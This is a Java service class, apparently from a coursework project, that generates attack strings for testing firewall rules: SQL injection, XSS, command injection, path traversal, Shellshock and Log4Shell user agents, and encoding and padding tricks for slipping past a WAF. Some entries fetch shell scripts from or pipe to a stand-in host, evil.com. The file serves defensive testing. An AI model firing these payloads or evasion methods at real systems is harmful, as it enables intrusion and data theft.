package edu.au.cpsc.module7.services;

import edu.au.cpsc.module7.models.AwsFirewallConfiguration.PayloadCategory;
import com.google.inject.Singleton;

import java.util.*;
import java.util.logging.Logger;
import java.util.function.Function;
import java.nio.charset.StandardCharsets;
import java.net.URLEncoder;
import java.util.stream.Collectors;

/**
 * Service for generating various types of payloads to test firewall rules
 */
@Singleton
public class FirewallPayloadGenerator {
    
    private static final Logger LOGGER = Logger.getLogger(FirewallPayloadGenerator.class.getName());
    
    // Enhanced payload categories with more sophisticated attacks
    private static final Map<PayloadCategory, List<String>> ENHANCED_PAYLOADS = Map.of(
        PayloadCategory.SQL_INJECTION, List.of(
            "' OR '1'='1",
            "' UNION SELECT NULL,NULL,NULL--",
            "'; DROP TABLE users; --",
            "' OR 1=1#",
            "' OR 'a'='a",
            "admin'--",
            "admin' /*",
            "' OR 1=1/*",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1 LIMIT 1 --",
            "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL --",
            "' AND (SELECT COUNT(*) FROM users) > 0 --",
            "' WAITFOR DELAY '00:00:10' --",
            "'; EXEC xp_cmdshell('dir') --",
            "' OR SLEEP(5) --",
            "' OR pg_sleep(5) --",
            "' OR BENCHMARK(5000000,MD5(1)) --",
            "' AND extractvalue(1,concat(0x7e,database(),0x7e)) --",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
        ),
        
        PayloadCategory.XSS, List.of(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<svg><script>alert('XSS')</script></svg>",
            "<math><mtext><script>alert('XSS')</script></mtext></math>"
        ),
        
        PayloadCategory.COMMAND_INJECTION, List.of(
            "; ls -la",
            "| whoami",
            "& dir",
            "; cat /etc/passwd",
            "|| id",
            "; uname -a",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "; ps aux",
            "| netstat -an",
            "& ipconfig /all",
            "; which python",
            "| find / -name '*.conf'",
            "; curl http://evil.com/",
            "| wget http://evil.com/shell.sh",
            "& powershell -c \"Get-Process\"",
            "; python -c \"import os; os.system('id')\"",
            "| perl -e \"system('whoami')\"",
            "; ruby -e \"system('id')\"",
            "| php -r \"system('whoami');\"",
            "& node -e \"require('child_process').exec('whoami')\""
        ),
        
        PayloadCategory.PATH_TRAVERSAL, List.of(
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
            "..//../..//../..//etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/var/www/../../etc/passwd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "..%u002f..%u002f..%u002fetc%u002fpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
        ),
        
        PayloadCategory.MALICIOUS_USER_AGENT, List.of(
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
            "() { :; }; echo; echo; /bin/bash -c \"cat /etc/passwd\"",
            "() { :; }; /usr/bin/curl -o /tmp/evil http://evil.com/shell.sh",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "Mozilla/5.0 ${jndi:ldap://evil.com/a}",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 AND 1=1",
            "curl/7.68.0 | nc evil.com 1234",
            "wget/1.20.3 ; cat /etc/passwd",
            "python-requests/2.25.1 || whoami",
            "Nikto/2.1.6 & dir",
            "sqlmap/1.5.7 ' OR 1=1 --",
            "Burp Suite Professional/2021.8.1",
            "OWASP ZAP/2021.8.1"
        ),
        
        PayloadCategory.LARGE_PAYLOAD, List.of(
            "A".repeat(8192) + "<script>alert('XSS')</script>",
            "B".repeat(16384) + "' OR 1=1 --",
            "C".repeat(32768) + "; cat /etc/passwd",
            "D".repeat(65536) + "../../../etc/passwd",
            "E".repeat(131072) + "SELECT * FROM users"
        ),
        
        PayloadCategory.TLS_FRAGMENTATION, List.of(
            // Simulate large TLS ClientHello messages that trigger the tldr.fail bug
            // Reference: https://tldr.fail/ - Post-quantum crypto migration issue
            "TLS_LARGE_CLIENTHELLO:" + "X".repeat(4096) + "KYBER_HANDSHAKE_DATA",
            "TLS_FRAGMENTED:" + "Y".repeat(8192) + "POST_QUANTUM_KEY_EXCHANGE", 
            "TLS_SPLIT_PACKET:" + "Z".repeat(2048) + "DILITHIUM_SIGNATURE_DATA",
            "TLS_OVERSIZED_HELLO:" + "A".repeat(16384) + "QUANTUM_RESISTANT_CRYPTO",
            "TLS_MULTI_PACKET:" + "B".repeat(32768) + "NIST_PQC_ALGORITHMS",
            "TLS_BUFFER_OVERFLOW:" + "C".repeat(65536) + "LARGE_CLIENTHELLO_TEST",
            // Classical TLS fragmentation tests (the bug existed before post-quantum)
            "TLS_CLASSICAL_SPLIT:" + "D".repeat(1500) + "TRADITIONAL_HANDSHAKE",
            "TLS_PARTIAL_READ:" + "E".repeat(3000) + "INCOMPLETE_CLIENTHELLO",
            "TLS_RECORD_BOUNDARY:" + "F".repeat(6000) + "RECORD_LENGTH_TEST",
            "TLS_TCP_SEGMENTATION:" + "G".repeat(12000) + "NETWORK_FRAGMENTATION"
        )
    );

    // Enhanced encoding methods
    private static final Map<String, Function<String, String>> ENCODING_METHODS = Map.of(
        "URL", payload -> {
            try {
                return URLEncoder.encode(payload, StandardCharsets.UTF_8);
            } catch (Exception e) {
                return payload;
            }
        },
        "DOUBLE_URL", payload -> {
            try {
                String encoded = URLEncoder.encode(payload, StandardCharsets.UTF_8);
                return URLEncoder.encode(encoded, StandardCharsets.UTF_8);
            } catch (Exception e) {
                return payload;
            }
        },
        "BASE64", payload -> Base64.getEncoder().encodeToString(payload.getBytes(StandardCharsets.UTF_8)),
        "HEX", payload -> {
            StringBuilder hex = new StringBuilder();
            for (byte b : payload.getBytes(StandardCharsets.UTF_8)) {
                hex.append(String.format("%%%02x", b));
            }
            return hex.toString();
        },
        "UNICODE", payload -> {
            StringBuilder unicode = new StringBuilder();
            for (char c : payload.toCharArray()) {
                if (c > 127) {
                    unicode.append(String.format("\\u%04x", (int) c));
                } else {
                    unicode.append(c);
                }
            }
            return unicode.toString();
        },
        "HTML_ENTITY", payload -> {
            StringBuilder entity = new StringBuilder();
            for (char c : payload.toCharArray()) {
                if (c == '<') entity.append("&lt;");
                else if (c == '>') entity.append("&gt;");
                else if (c == '&') entity.append("&amp;");
                else if (c == '"') entity.append("&quot;");
                else if (c == '\'') entity.append("&#39;");
                else entity.append(c);
            }
            return entity.toString();
        },
        "CASE_VARIATION", payload -> {
            StringBuilder varied = new StringBuilder();
            Random random = new Random();
            for (char c : payload.toCharArray()) {
                if (Character.isLetter(c)) {
                    varied.append(random.nextBoolean() ? Character.toUpperCase(c) : Character.toLowerCase(c));
                } else {
                    varied.append(c);
                }
            }
            return varied.toString();
        },
        "COMMENT_INJECTION", payload -> {
            if (payload.contains("SELECT")) {
                return payload.replace("SELECT", "SEL/**/ECT");
            } else if (payload.contains("UNION")) {
                return payload.replace("UNION", "UNI/**/ON");
            } else if (payload.contains("script")) {
                return payload.replace("script", "scr/**/ipt");
            }
            return payload;
        }
    );
    
    /**
     * Generate payloads for a specific category
     */
    public List<String> generatePayloads(PayloadCategory category, int count) {
        List<String> basePayloads = ENHANCED_PAYLOADS.getOrDefault(category, List.of("test"));
        List<String> result = new ArrayList<>();
        
        // Take requested number of base payloads
        List<String> selectedPayloads = basePayloads.stream()
            .limit(count)
            .collect(Collectors.toList());
        
        // Generate encoded variations for each payload
        for (String payload : selectedPayloads) {
            result.add(payload); // Original payload
            
            // Apply each encoding method
            for (Map.Entry<String, Function<String, String>> encoder : ENCODING_METHODS.entrySet()) {
                try {
                    String encoded = encoder.getValue().apply(payload);
                    if (!encoded.equals(payload)) {
                        result.add(encoded);
                    }
                } catch (Exception e) {
                    // Skip failed encodings
                }
            }
        }
        
        return result;
    }
    
    /**
     * Generate HTTP headers for testing
     */
    public Map<String, String> generateSuspiciousHeaders() {
        Map<String, String> headers = new HashMap<>();
        headers.put("X-Forwarded-For", "127.0.0.1");
        headers.put("X-Real-IP", "192.168.1.1");
        headers.put("X-Originating-IP", "10.0.0.1");
        headers.put("X-Remote-IP", "localhost");
        headers.put("X-Client-IP", "127.0.0.1");
        headers.put("Host", "evil.com");
        headers.put("Referer", "http://malicious.example.com/");
        headers.put("User-Agent", "() { :; }; /bin/bash -c \"cat /etc/passwd\"");
        return headers;
    }
    
    /**
     * Generate large payloads to test size limits
     */
    private List<String> generateLargePayloads() {
        List<String> payloads = new ArrayList<>();
        
        // Generate payloads of various sizes
        int[] sizes = {1024, 8192, 65536, 1048576}; // 1KB, 8KB, 64KB, 1MB
        
        for (int size : sizes) {
            StringBuilder payload = new StringBuilder();
            for (int i = 0; i < size; i++) {
                payload.append("A");
            }
            payloads.add(payload.toString());
        }
        
        return payloads;
    }
    
    /**
     * Generate URL-encoded payloads
     */
    public List<String> generateUrlEncodedPayloads(PayloadCategory category) {
        List<String> originalPayloads = generatePayloads(category, 10); // Generate 10 variations
        List<String> encodedPayloads = new ArrayList<>();
        
        for (String payload : originalPayloads) {
            try {
                String encoded = java.net.URLEncoder.encode(payload, "UTF-8");
                encodedPayloads.add(encoded);
            } catch (Exception e) {
                LOGGER.warning("Failed to URL encode payload: " + payload);
            }
        }
        
        return encodedPayloads;
    }
    
    /**
     * Generate double URL-encoded payloads
     */
    public List<String> generateDoubleEncodedPayloads(PayloadCategory category) {
        List<String> originalPayloads = generatePayloads(category, 10); // Generate 10 variations
        List<String> doubleEncodedPayloads = new ArrayList<>();
        
        for (String payload : originalPayloads) {
            try {
                String encoded = java.net.URLEncoder.encode(payload, "UTF-8");
                String doubleEncoded = java.net.URLEncoder.encode(encoded, "UTF-8");
                doubleEncodedPayloads.add(doubleEncoded);
            } catch (Exception e) {
                LOGGER.warning("Failed to double URL encode payload: " + payload);
            }
        }
        
        return doubleEncodedPayloads;
    }
    
    /**
     * Generate Base64 encoded payloads
     */
    public List<String> generateBase64EncodedPayloads(PayloadCategory category) {
        List<String> originalPayloads = generatePayloads(category, 10); // Generate 10 variations
        List<String> base64Payloads = new ArrayList<>();
        
        for (String payload : originalPayloads) {
            try {
                String encoded = Base64.getEncoder().encodeToString(payload.getBytes("UTF-8"));
                base64Payloads.add(encoded);
            } catch (Exception e) {
                LOGGER.warning("Failed to Base64 encode payload: " + payload);
            }
        }
        
        return base64Payloads;
    }
    
    /**
     * Generate custom payload based on user input
     */
    public String generateCustomPayload(String template, Map<String, String> parameters) {
        String payload = template;
        
        for (Map.Entry<String, String> entry : parameters.entrySet()) {
            payload = payload.replace("${" + entry.getKey() + "}", entry.getValue());
        }
        
        return payload;
    }
    
    /**
     * Get all available payload categories
     */
    public List<PayloadCategory> getAllCategories() {
        return Arrays.asList(PayloadCategory.values());
    }
    
    /**
     * Get description for a payload category
     */
    public String getCategoryDescription(PayloadCategory category) {
        switch (category) {
            case SQL_INJECTION:
                return "SQL Injection attacks targeting database vulnerabilities";
            case XSS:
                return "Cross-Site Scripting attacks targeting client-side vulnerabilities";
            case COMMAND_INJECTION:
                return "Command injection attacks targeting system command execution";
            case PATH_TRAVERSAL:
                return "Path traversal attacks targeting file system access";
            case MALICIOUS_USER_AGENT:
                return "Malicious user agent strings that may bypass security filters";
            case SUSPICIOUS_HEADERS:
                return "Suspicious HTTP headers that may indicate malicious activity";
            case LARGE_PAYLOAD:
                return "Large payloads designed to test size-based filtering";
            case TLS_FRAGMENTATION:
                return "TLS fragmentation tests for post-quantum crypto readiness (see https://tldr.fail/)";
            case CUSTOM:
                return "Custom payloads defined by the user";
            default:
                return "Unknown payload category";
        }
    }

    // Add method for padding attacks (WAF bypass technique)
    public String addPadding(String payload, int paddingSize) {
        StringBuilder padded = new StringBuilder();
        
        // Add padding before payload
        padded.append("X".repeat(paddingSize * 1024));
        padded.append(payload);
        
        return padded.toString();
    }

    // Add method for generating time-based payloads
    public List<String> generateTimeBasedPayloads() {
        return List.of(
            "' OR SLEEP(5) --",
            "' OR pg_sleep(5) --",
            "' OR BENCHMARK(5000000,MD5(1)) --",
            "' WAITFOR DELAY '00:00:05' --",
            "'; SELECT sleep(5) --",
            "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5)) --",
            "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --"
        );
    }

    /**
     * Generate TLS fragmentation payloads to test for the tldr.fail bug
     * Reference: https://tldr.fail/ - Servers that fail on large ClientHello messages
     * 
     * This tests if servers properly handle TLS ClientHello messages that span
     * multiple TCP packets, which is critical for post-quantum crypto migration.
     */
    public List<String> generateTlsFragmentationPayloads() {
        List<String> payloads = new ArrayList<>();
        
        // Post-quantum crypto simulation payloads (the main tldr.fail issue)
        payloads.add("POST_QUANTUM_CLIENTHELLO:" + "X".repeat(4096) + ":KYBER_HANDSHAKE");
        payloads.add("LARGE_PQ_HELLO:" + "Y".repeat(8192) + ":DILITHIUM_SIGNATURE");
        payloads.add("OVERSIZED_HELLO:" + "Z".repeat(16384) + ":NIST_PQC_ALGORITHMS");
        
        // Classical fragmentation tests (bug existed before post-quantum)
        payloads.add("FRAGMENTED_HANDSHAKE:" + "A".repeat(2048) + ":CLASSICAL_TLS");
        payloads.add("SPLIT_CLIENTHELLO:" + "B".repeat(3072) + ":TRADITIONAL_CRYPTO");
        
        // Boundary condition tests
        payloads.add("PACKET_BOUNDARY:" + "C".repeat(1500) + ":MTU_SIZE_TEST");
        payloads.add("BUFFER_OVERFLOW:" + "D".repeat(65536) + ":LARGE_BUFFER_TEST");
        
        return payloads;
    }

    /**
     * Generate payloads that simulate partial TLS reads
     * This tests the specific bug where servers call read() once and fail
     * instead of looping until the complete message is received
     */
    public List<String> generatePartialReadPayloads() {
        return List.of(
            "PARTIAL_TLS_READ_TEST:" + "P".repeat(2048) + ":INCOMPLETE_MESSAGE",
            "SPLIT_RECORD_TEST:" + "Q".repeat(4096) + ":FRAGMENTED_RECORD",
            "MULTI_PACKET_TEST:" + "R".repeat(8192) + ":REQUIRES_MULTIPLE_READS"
        );
    }

} 